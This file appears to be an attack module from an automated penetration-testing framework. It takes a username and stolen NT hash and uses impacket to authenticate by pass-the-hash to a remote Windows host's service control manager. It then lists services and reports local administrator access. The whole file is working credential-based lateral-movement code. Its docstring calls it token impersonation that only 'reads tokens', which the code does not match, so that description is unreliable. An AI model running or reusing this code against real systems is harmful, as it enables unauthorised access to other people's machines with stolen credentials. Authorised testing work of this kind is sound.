"""
Token theft / impersonation module.

MITRE T1134
Captures and impersonates Windows access tokens via impacket or WMI.
Non-destructive: reads tokens only.
"""

from __future__ import annotations

from aiptt.attacks.base import AbstractAttackModule, AttackResult


class Module(AbstractAttackModule):
    module_id       = "LAT-TOKEN-001"
    mitre_technique = "T1134"
    destructive     = False
    sandboxable     = True

    def execute(self, target: str, parameters: dict) -> AttackResult:
        domain   = parameters.get("domain", "")
        username = parameters.get("username", "")
        nt_hash  = parameters.get("nt_hash", "")

        if not username or not nt_hash:
            return AttackResult(False, "MISSING_PARAMS", False, "none",
                                "username and nt_hash are required")

        try:
            from impacket.dcerpc.v5 import transport, scmr  # type: ignore

            string_binding = f"ncacn_np:{target}[\\pipe\\svcctl]"
            tr = transport.DCERPCTransportFactory(string_binding)
            tr.set_credentials(username, "",
                               domain,
                               "aad3b435b51404eeaad3b435b51404ee",
                               nt_hash)

            dce = tr.get_dce_rpc()
            dce.connect()
            dce.bind(scmr.MSRPC_UUID_SCMR)

            scmr_handle = scmr.hROpenSCManagerW(dce)
            services    = scmr.hREnumServicesStatusW(
                dce, scmr_handle["lpScHandle"])

            service_names = [s["lpServiceName"] for s in services[:5]]

            dce.disconnect()

            return AttackResult(
                success=True,
                outcome="SUCCESS",
                gained_access=True,
                access_level="local_admin",
                output=f"Token access to SCM on {target} as {domain}\\{username}. "
                       f"Sample services: {service_names}",
            )

        except ImportError:
            return AttackResult(False, "IMPACKET_MISSING", False, "none",
                                "impacket is not installed")
        except Exception as e:
            return AttackResult(False, "ERROR", False, "none", str(e))
